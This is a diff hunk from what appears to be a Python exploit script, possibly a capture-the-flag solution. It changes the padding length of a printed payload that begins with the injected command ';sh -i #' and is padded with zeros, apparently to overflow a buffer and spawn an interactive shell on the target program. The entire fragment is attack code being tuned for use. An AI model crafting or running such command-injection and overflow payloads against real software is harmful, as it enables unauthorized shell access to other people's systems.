@@ -36,7 +36,7 @@ def main():
 		b[0] = '\0'
 	"""
 	magic = ";sh -i #"
-	padding = '0' * (216 - (len(magic) + 1))
+	padding = '0' * (192 - (len(magic) + 1))
 	print(magic + padding)
 
 
